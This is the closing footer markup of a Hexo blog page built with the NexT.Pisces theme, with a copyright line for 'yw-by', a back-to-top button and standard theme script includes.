            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">yw-by</span>
  </div>
<!--
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>
-->

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
